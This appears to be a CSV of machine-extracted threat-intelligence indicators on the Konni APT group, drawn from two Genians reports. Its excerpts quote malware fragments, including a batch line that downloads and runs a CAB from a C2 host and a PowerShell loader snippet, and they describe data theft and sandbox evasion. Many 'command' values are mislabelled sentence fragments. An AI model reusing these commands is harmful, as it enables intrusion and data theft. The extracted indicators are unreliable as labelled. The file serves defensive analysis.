schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:d8beb275c90351928723b3334c0767ee898525b39eecb8bab72b797f55365c20,observation--sha256:2396d591e00a3f8fce8412a3acad9eb02a76b5c6116e22baf6a1be47961acac4,command,○ Powershell 명령은 ‘$temple’ 영역에 선언된 16 진수 블럭을 호출해 사용합니다. 이 값을,○ Powershell 명령은 ‘$temple’ 영역에 선언된 16 진수 블럭을 호출해 사용합니다. 이 값을,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 14 ○ Powershell 명령은 ‘$temple’ 영역에 선언된 16 진수 블럭을 호출해 사용합니다. 이 값을 ASCII 코드로 변환하면 상세 명령을 확인할 수 있습니다. $LsUvVpNHlCfpw = Get - Location; $SEvhgMDD = Get - ChildItem - Path $LsUvVpNHlCfpw - Recurse * .lnk | where - object { $_.length - eq 0x1466956A } | Select - Object - ExpandProperty FullName; if ($SEvhgMDD.length - eq 0) { $LsUvVpNHlCfpw = $env: Temp; $SEvhgMDD = Get - ChildItem - Path $LsUvVpNHlCfpw - Recurse * .lnk | where - object { $_.length - e,
1.0.0,actor--konni,artifact--sha256:04d380fafb37e65904d8d60dc38440b5a8a1ba48fc925781677238204f7c2d60,observation--sha256:4594db7f22cd193ebde62e83f14d978e7eff089bbc334a6a97ff7f6dd1151daa,command,○ ‘19288086.bat’ 파일은 환경변수 조건에 따라 Powershell 명령을 통해 [RC4+Base64],○ ‘19288086.bat’ 파일은 환경변수 조건에 따라 Powershell 명령을 통해 [RC4+Base64,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 33 f. ‘19288086.bat’ ○ ‘19288086.bat’ 파일은 환경변수 조건에 따라 Powershell 명령을 통해 [RC4+Base64] 암호화와 다운로드 설정 루틴을 지니고 있습니다. 파일명 19288086.bat MD5 b4461d68a8026981ab47294c2c7b5d91 SHA1 f1b4748d50a38952edc2f0953cd270ec17bb5b2a SHA256 79f61da076edf4cc9434e1c1f25ca62664d5f0bc5b9b91736 60f3089491eb8fe [표 14] 19288086.bat 파일 HASH 정보 화면 ○ 변수명 (if not ""%ypczipzqWxLByMQH%"" == ""0"") 에 따라 암호화 루틴이 작동하는데, ‘73888454.bat’ 파일에서 호출 될 때 사용이 됩니다. [그림 25] 19288086.bat 내부 코드 화면",
1.0.0,actor--konni,artifact--sha256:65743e0cccab44b22151de362a28d1c2a1bc32b558ea48d73500a1cd7c0f989c,observation--sha256:77e91390f5916de2d831ce35f1cfb980b4d0db08f20427608d538190027a9858,command,○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다.,○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 주요 문자열은 10진수 값으로 선언되어 있고, XOR 로직을 통해 ASCII 문자로변환되는과정을거치게됩니다. [그림4-1] 'update.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 25개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'stopedge.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'install.vbs' 파일코드분석 ○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다. Genians SecurityCenter 19",
1.0.0,actor--konni,artifact--sha256:dec93e2267ce5d870f6f840687367ae2c438459d9a336ef5bd31541edecfbd87,observation--sha256:6fb3d1c951ce6f57287610d5de2e0207c604dd1a398833cca76f727ec5fa1e56,command,데이터를 블럭화해 Powershell 명령을 수행합니다. 미끼로 보여줄 정상 (문서) 파일 후위에,데이터를 블럭화해 Powershell 명령을 수행합니다. 미끼로 보여줄 정상 (문서) 파일 후위에,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 5 d. 공격 전술 및 기술, 절차 (TTPs) & 킬 스위치 ○ 공격자는 다양한 실전 경험을 통해 효과적인 위협 시나리오를 기획하고, 거점용 C2(명령제어) 서버를 구축해 본격적인 공격을 준비합니다. 그리고 공격 대상자를 선정 후 현혹될 만한 주제의 내용과 악성 파일을 개발해 스피어 피싱 공격을 수행했습니다. ○ LNK 바로가기 타입의 공격은 국내에서 다수 보고되고 있습니다. 특히, APT37 그룹은 자동화된 악성코드 제작도구까지 도입해 활용하는 등 나름 적극적으로 사용 중인데, 코니 그룹이 사용한 코드와는 기술적으로 일부 상이한 구조를 보입니다. ○ APT37 그룹과 다르게 코니 그룹이 사용한 LNK 파일은 포맷 내부에 16 진수 스트링 데이터를 블럭화해 Powershell 명령을 수행합니다. 미끼로 보여줄 정상 (문서) 파일 후위에 악성 ZIP 또는 CAB 압축 포맷이 연이어 내장돼 있는",
1.0.0,actor--konni,artifact--sha256:1375638c11b8b4aa509559886233bd419dae0be961cf529b4d224b4f1a74d389,observation--sha256:dda13449a909782a1b381c3b6275f6572a6d1a22d679f9850ae3815c4d2d80c0,command,사용된 Powershell 코드를 자세히 파악할 수 있습니다.,사용된 Powershell 코드를 자세히 파악할 수 있습니다,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 13 ○ LNK Parser 5 도구를 통해 내부 환경변수 위치에 선언된 ‘cmd.exe’ 명령과 인자값으로 사용된 Powershell 코드를 자세히 파악할 수 있습니다. [그림 08] LNK 내부 데이터 추출 화면 5 LNK Parser,
1.0.0,actor--konni,artifact--sha256:a7b9a74ecab1914b9e09a0efb6e815ab5b3dd2a66791a0868897f3dbaae87eb5,observation--sha256:6a525fb5193dc0dbd26d9283ab3149eebca5a57b688d66456f9204175372bbb7,command,암호화를 해제하는 Key 값으로 앞서 설명한 [Powershell (Get-Date).ticks] 내용입니다.,암호화를 해제하는 Key 값으로 앞서 설명한 [Powershell (Get-Date).ticks] 내용입니다,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 25 ○ (goto 1) 루틴으로 점프하면, 가장 먼저 ‘temprun.bat’ 파일이 있는지 비교하고 존재할 경우 삭제를 진행합니다. 그리고 call 배치 명령을 통해 ‘19288086.bat’ 파일을 호출합니다. call 19288086.bat ""http://overseeby[.]com/list.php?f=%COMPUTERNAME%.txt"" ""%~dp0IxOkj.cab"" ""1""> nul expand IxOkj.cab -F:* %~dp0 > nul del /f /q IxOkj.cab > nul call temprun.bat > nul [표 09] C2 호스트에서 압축파일 다운로드 및 실행 과정 화면 ○ C2(overseeby [.]com) 명령을 통해 감염된 컴퓨터명의 파일이 서버에 존재할 경우 ‘IxOkj.cab’ 이름으로 다운로드하고 ‘expand’ 명령을 통해 압축을 풀고 삭제합니다. ",
1.0.0,actor--konni,artifact--sha256:2b86d1bacc983fad748a85a77394c4b517cd1240aa4d56c19afeee0779cd096f,observation--sha256:c506f52babeecc15125778be6374bc457241ef0782981ea12646d2621e194d10,command,주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell,주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:133732f2c82114ac11bdbfa1740063a41191b1c9205b179651250c0c5da7edf8,observation--sha256:ac53b57627dd56ac48dcd8a62a9a8bdb6fb6fd580d343bcd3abcee9fad1a9957,command,"컴퓨터의 주요 정보를 수집해 유출을 시도하고, 순차적 다단계 (VBS, BAT, Powershell)","컴퓨터의 주요 정보를 수집해 유출을 시도하고, 순차적 다단계 (VBS, BAT, Powershell",candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 3 b. 악성 파일 동작 흐름도 (Malware Flowchart) ○ 세금 관련 이슈는 기업 관계자로서 매우 민감한 소재 중 하나로 실제 공격을 받은 대상자는 대북분야 기업의 대표입니다. 수신자로 하여금 불안 심리를 증폭시켜, 첨부 파일에 대한 접근을 보다 빠르게 만들기 위한 위협 전략으로 관측됩니다. 이메일에는 ‘소명자료 제출요청 안내.zip’ 이름의 압축 파일이 첨부돼 있으며, 압축 파일 내부에는 2 개의 HWP 문서 파일과 1 개의 LNK 바로가기 파일이 포함돼 있습니다. LNK 파일명은 ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 입니다. ○ ‘ 소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 바로가기 파일이 실행되면 피해자 컴퓨터의 주요 정보를 수집해 유출을 시도하고, 순차적 다단계 (VBS, BAT, Powershell) 명령을 통해 추가 악성 파일 설치 등 잠재적 위",
1.0.0,actor--konni,artifact--sha256:42d9e2ff1ab97106469b615dbfcfa7b94894aa0645a952bafd25695924bb35fd,observation--sha256:5ab5dc3284fcc53449e796a5e99b80481cea62f1c7acbbe1b4e55fc94889a978,command,"코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을","코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을",candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:d0eb4418154035402e645c1a1e1a75be46737121c6b2ac05210e7aac8a54bd92,observation--sha256:f93da26bcbba10721b8e2fcabd7c6a55c9a03d68c98eb2e38e546b20b37ab82f,command,"해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의","해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의",candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:dca23757e9171441f67a8f9e4aa21d95de398261c10db4c39c52b7e9db45b1c8,observation--sha256:5dcf22072e01e64e48f5b630a96ca3e91c55df98dd1fb0c1e2fff060bf1cebbd,file-name,-32981202.bat,-32981202.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
1.0.0,actor--konni,artifact--sha256:f86aab46f2c037ee9d346002f93bf9627a53d54f204ea43cd0507bb2c8ce94f5,observation--sha256:e059cfa224d99f58df3325b5c2986ca3698f95c0b26e9bf9734e712a5772cf40,file-name,-versioninfo.bat,-versioninfo.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
1.0.0,actor--konni,artifact--sha256:a1a3a13801a56bb687724d736a7f1af4098d239d2dc8e9ecfce3f5bbae1ec019,observation--sha256:d239cc0aeb6df07780a1180a029eadbf82a617f435b15768278798d583593156,file-name,04769.zip,04769.zip,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 15 ○ 내부에 선언된 인자값은 LNK 전체 길이 ‘0x1466956A’ (342,267,242 바이트) 값을 확인합니다. 그리고 ‘0x00003C4A’ 오프셋 부터 ‘0x00006C00’ 값을 읽어 유니코드 이스케이프 포맷 6에 선언한 ‘소명자료 목록(국세징수법 시행규칙).hwp’ 파일로 생성 후 실행합니다. 그리고 기존 LNK 파일은 삭제됩니다. Unicode Escape Unicode Unescape \uC18C\uBA85\uC790\uB8CC \u0020\uBAA9\uB85D\u0028 \uAD6D\uC138\uC9D5\uC218 \uBC95\u0020\uC2DC\uD589 \uADDC\uCE59\u0029\u002E \u0068\u0077\u0070 소명자료 목록(국세징수법 시행규칙).hwp [표 03] 유니코드 문자 변환 화면 ○ 다음으로 ‘0x0000A84A’ 오프셋 부터 ‘0x0",
1.0.0,actor--konni,artifact--sha256:a1a3a13801a56bb687724d736a7f1af4098d239d2dc8e9ecfce3f5bbae1ec019,observation--sha256:746b2c55587dbb45b31789dfdab329edb3ff0b36a815b9c3a19e3460f0397353,file-name,04769.zip,04769.zip,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 17 ○ ‘04769.zip’ 파일은 공용 문서 폴더 경로에 압축을 해제하는데, 총 7 개의 파일을 포함하고 있습니다. [그림 09] LNK 내부 데이터 추출 화면 ○ 각 스크립트와 배치파일은 상호 연동하여 작동하는데, 기본적으로 컴퓨터 내 주요 파일 목록과 시스템 정보, 공인 아이피 주소, 실행 프로세스 상태를 수집하고 저장하는 정찰활동을 수행합니다. 그리고 RC4 알고리즘으로 암호화하고, Base64 인코딩을 거친 후 명령제어(C2) 서버로 수집된 자료를 은밀히 전송합니다. ○ 공격자는 1 차 수집된 피해자 정보 기반으로 후속 공격 대상 컴퓨터를 선별합니다. 따라서 샌드박스(SandBox)나 위협 분석가의 가상(VMware) 환경에는 추가 악성 파일을 설치하지 않아, 최종 페이로드(Payload) 모듈 확보가 제한적 입니다. 다만, 과거 유사 피해 사례에서 RAT/Bot 계열의 악성 파일이",
